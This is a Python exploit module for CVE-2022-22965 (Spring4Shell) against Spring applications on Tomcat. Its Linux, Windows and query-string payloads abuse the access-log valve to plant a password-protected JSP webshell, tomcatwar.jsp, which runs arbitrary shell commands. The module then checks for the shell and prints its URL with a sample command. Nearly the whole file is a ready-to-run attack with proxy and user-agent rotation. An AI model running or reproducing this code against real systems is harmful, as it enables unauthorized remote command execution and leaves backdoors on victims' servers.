# coding:utf-8

import aiohttp
import asyncio
from util import RandomUA

class CVE_2022_22965_Async:
    def __init__(self):
        ua = RandomUA.RandomUA()
        self.ua = ua.UserAgent()
        self.Headers_1 = {
            "User-Agent": self.ua,
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        self.payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        self.payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        self.data1 = self.payload_linux
        self.data2 = self.payload_win

    async def fetch(self, session, url, headers, data, proxies):
        try:
            async with session.post(url=url, headers=headers, data=data, verify_ssl=False, proxies=proxies, timeout=6) as response:
                return await response.text(), response.status
        except Exception as e:
            return str(e), 0

    async def poc(self, url, proxies, ProxyStute):
        if ProxyStute == 1:
            proxy = proxies
        else:
            proxy = None
        try:
            async with aiohttp.ClientSession() as session:
                # Asynchronously perform the requests
                await asyncio.gather(
                    self.fetch(session, url, self.Headers_1, self.data1, proxy),
                    asyncio.sleep(0.5),  # Sleep for 0.5 seconds between requests
                    self.fetch(session, url, self.Headers_1, self.data2, proxy),
                    asyncio.sleep(0.5),  # Sleep for 0.5 seconds between requests
                    self.fetch(session, url + self.payload_http, self.Headers_1, "", proxy),
                    asyncio.sleep(0.5)  # Sleep for 0.5 seconds between requests
                )

                # Check the result
                test_text, test_code = await self.fetch(session, url + "tomcatwar.jsp", self.Headers_1, "", proxy)

            if test_code == 200 and 'aabysszg' in str(test_text):
                result = f'[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：{url}tomcatwar.jsp?pwd=aabysszg&cmd=whoami'
                return result
            else:
                result = f'[-] {url} CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问：[/tomcatwar.jsp?pwd=aabysszg&cmd=命令]'
                return result
        except Exception as e:
            error = f"[error] {url} 未知错误 {e}"
            return error
    async def exp(self, url, proxies, ProxyStute):
        pass